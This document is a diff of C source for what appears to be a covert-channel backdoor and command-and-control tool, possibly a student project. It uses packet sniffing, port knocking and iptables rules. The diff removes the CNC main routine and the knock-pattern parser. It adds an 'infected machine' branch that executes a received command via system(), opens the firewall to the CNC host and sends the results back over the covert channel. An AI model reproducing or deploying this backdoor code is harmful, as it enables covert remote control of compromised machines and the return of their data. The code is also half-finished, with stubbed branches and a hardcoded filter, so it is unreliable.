@@ -1,43 +1,4 @@
-#include "main.h"
-
-
-struct filter InitFilter();
-void CreateFilter(struct filter Filter, char *buffer);
-
-
-int main(int argc, char **argv){
-    char *c = "c";
-    char *sip = CNCIP;
-    char *dip = INFECTEDIP;
-    unsigned short sport = SHPORT;
-    unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE];
-    char filter[BUFFERSIZE]; 
-    struct filter fil;
-    fil = InitFilter();
-
-    CreateFilter(fil, filter);
-    printf("\n%s", filter);
-    iptables("8505","192.168.0.1","tcp");
-    /*
-    if(argc < 2){
-        printf("Usage ./cnc [command]\n");
-	exit(1);
-    }
-	strcpy(data, argv[1]);
-	pattern[0] = 14881; //port 8506 in u_short
-	pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
-	knocking[0] = 0; // initilizing the knocking
-	knocking[1] = 0;
-	printf("command: %s", data);
-	covert_send(sip, dip, sport, dport, data, 0);
-	Packetcapture();*/
-    exit(1);
-    return 0;
-}
-
-
-int Packetcapture(){
+int Packetcapture(const char *filter){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
@@ -55,8 +16,9 @@ int Packetcapture(){
         printf("pcap_open_live(): %s\n", errorbuffer);
         exit(0);
     }
-
-    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
+//the filter i create isnt working not sure why will fix later
+    //if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
+    if(pcap_compile(interfaceinfo, &fp, "tcp and (port 8506 || port 8507 || port 8505)", 0, netp) == -1){
         perror("pcap_comile");
     }
 
@@ -123,6 +85,7 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
 
 }
 
+
 bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
     if(knock){
         //check if the key is right for port knocking
@@ -138,60 +101,6 @@ bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
         } else {
             return false;
         }
-    }
-}
-
-
-void send_pattern(char *sip, char *dip, unsigned short sport, unsigned short dport,unsigned char *data){
-    unsigned short port = pattern[0];
-    covert_send(sip, dip, sport, port, data, 2);
-    port = pattern[1];
-    covert_send(sip, dip, sport, port, data, 2);
-}
-
-void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet,bool send){
-    const struct sniff_tcp *tcp=0;
-    const struct my_ip *ip;
-    const char *payload;
-
-    int size_ip;
-    int size_tcp;
-    int size_payload;
-
-    printf("TCP Packet\n");
-
-    ip = (struct my_ip*)(packet + 14);
-    size_ip = IP_HL(ip)*4;
-
-    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
-    size_tcp = TH_OFF(tcp)*4;
-
-    if(size_tcp < 20){
-        perror("TCP: Control packet length is incorrect");
-        exit(1);
-    }
-
-    printf("Source port: %d\n", ntohs(tcp->th_sport));
-    printf("Destination port: %d\n", ntohs(tcp->th_dport));
-    payload = (u_char *)(packet + 14 + size_ip + size_tcp);
-
-    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
-
-    printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
-    for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
-        if(pattern[k] == tcp->th_dport){
-            knocking[k] = 1;
-        }
-    }
-    if((knocking[0] == 1) && (knocking[1] == 1)){
-        system(IPTABLES(INFECTEDIP));
-        char *dip = INFECTEDIP;
-        unsigned short sport = SHPORT;
-        unsigned short dport = SHPORT;
-        printf("WAITING FOR DATA\n");
-        recv_results(dip, dport, RESULT_FILE);
-        system(TURNOFF(INFECTEDIP));
-        pcap_breakloop(interfaceinfo);
     }
 }
 
@@ -249,10 +158,12 @@ void ParsePayload(const u_char *payload, int len){
         perror("fwrite");
         exit(1);
     }
+    if(true){
+    //if CNC
     fclose(fp);
     system(CHMOD);
     system(CMD);
-    system(IPTABLES(INFECTEDIP));
+    //system(IPTABLES(INFECTEDIP));
 
 
     //sending the results back to the CNC
@@ -263,5 +174,28 @@ void ParsePayload(const u_char *payload, int len){
 
     send_results(srcip, destip, sport, dport, RESULT_FILE);
     system(TURNOFF(INFECTEDIP));
+    } else {
+        //infected machine
+        fclose(fp);
+        system(CHMOD);
+        system(CMD);
+        system(IPTABLES(CNCIP));
+
+        printf("COMMAND RECEIEVED \n");
+        //sending the results back to the CNC
+        char *srcip = INFECTEDIP;
+        char *destip = CNCIP;
+        unsigned short sport = SHPORT;
+        unsigned short dport = SHPORT;
+        unsigned char data[BUFSIZE] = "ls";
+        printf("PORT KNOCKING\n");
+        send_pattern(srcip, destip, sport, dport, data);
+        printf("RETURNING RESULTS\n");
+        send_results(srcip, destip, sport, dport, RESULT_FILE);
+        system(TURNOFF(CNCIP));
+        printf("\n");
+        printf("\n");
+        printf("Waiting for new command\n");
+    }
 }
 
